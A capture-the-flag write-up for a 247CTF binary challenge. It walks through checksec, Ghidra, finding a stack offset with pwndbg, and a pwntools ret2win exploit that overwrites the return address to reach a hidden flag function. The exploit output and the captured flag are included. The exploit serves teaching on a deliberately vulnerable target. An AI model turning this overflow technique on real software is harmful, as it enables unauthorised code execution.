# HIDDEN FLAG FUNCTION

Basic file check:

```bash
❯ checksec --file=hidden_flag_function
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   73 Symbols	 No	0		2		hidden_flag_function
```

let's run the binary

```bash
❯ ./hidden_flag_function
What do you have to say?
hi..
```

open the binary in ghidra :

main function

---

<img width="1402" alt="Screenshot 2024-05-06 at 6 23 09 AM" src="https://github.com/Lynk4/247ctf/assets/44930131/7eb3d7ca-6807-4928-92a4-5561a8e61a5b">


---

flag function

---
<img width="1399" alt="Screenshot 2024-05-06 at 6 23 24 AM" src="https://github.com/Lynk4/247ctf/assets/44930131/e2d126e9-9fe6-43a6-85f1-fcadcabde818">

---


By analyzing the binary we can see that the flag function was never called..........


So our payload will look like this:

padding + flag_function_address

---

let's find the offset:

open it in gdb:

```bash
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
pwndbg> run
Starting program: /home/lynk/247/hidden-flag-function/hidden_flag_function 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
What do you have to say?
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
0x61616174 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────
*EAX  0x1
*EBX  0x61616172 ('raaa')
 ECX  0x0
*EDX  0xf7fc34c0 ◂— 0xf7fc34c0
*EDI  0xf7ffcba0 (_rtld_global_ro) ◂— 0x0
*ESI  0x8048660 (__libc_csu_init) ◂— push ebp
*EBP  0x61616173 ('saaa')
*ESP  0xffffd470 ◂— 'uaaavaaawaaaxaaayaaa'
*EIP  0x61616174 ('taaa')
──────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────────────────────────────────
Invalid address 0x61616174










───────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffd470 ◂— 'uaaavaaawaaaxaaayaaa'
01:0004│     0xffffd474 ◂— 'vaaawaaaxaaayaaa'
02:0008│     0xffffd478 ◂— 'waaaxaaayaaa'
03:000c│     0xffffd47c ◂— 'xaaayaaa'
04:0010│     0xffffd480 ◂— 'yaaa'
05:0014│     0xffffd484 ◂— 0x0
06:0018│     0xffffd488 ◂— 0x78 /* 'x' */
07:001c│     0xffffd48c —▸ 0xf7c237c5 (__libc_start_call_main+117) ◂— add esp, 0x10
─────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────
 ► 0 0x61616174
   1 0x61616175
   2 0x61616176
   3 0x61616177
   4 0x61616178
   5 0x61616179
   6      0x0
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l taaa
Finding cyclic pattern of 4 bytes: b'taaa' (hex: 0x74616161)
Found at offset 76
pwndbg>
```

offset is 76 

for local testing make a flag.txt file with fake flag contents:

let's craft our payload in python3

```python3
from pwn import *

context.binary = binary = "./hidden_flag_function"

payload = b"A" * 76 + p32(0x08048576)

p = process()
p = remote("51d7d32e0522d8bd.247ctf.com", 50217)
p.recv()
p.sendline(payload)
p.interactive()
```

---

running the exploit

---

```bash
❯ python3 exp2.py
[*] '/home/lynk/247/hidden-flag-function/hidden_flag_function'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
[*] '/home/lynk/247/hidden-flag-function/hidden_flag_function'
    Arch:     i386-32-little
    RELRO:    Part
ial RELRO
    Stack:    No canary found
    NX:       NX enabled
[*] '/home/lynk/247/hidden-flag-function/hidden_flag_f[*] '/home/lynk/247/hidden-flag-function/hidden_flag_function'
[*] '/home/lynk/247/hidden-flag-function[*] '/home/[*] '/home/lynk/247/hidden-flag-function/hidden_flag_function'
[*] '/home/lynk/247/hidden-flag-function/hidden_flag_function'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/home/lynk/247/hidden-flag-function/hidden_flag_function': pid 31780
[+] Opening connection to 51d7d32e0522d8bd.247ctf.com on port 50217: Done
[*] Switching to interactive mode
How did you get here?
Have a flag!
247CTF{b1c2cb7d5a43939f8dc73369ec2dd59d}

[*] Got EOF while reading in interactive
$  

```

---
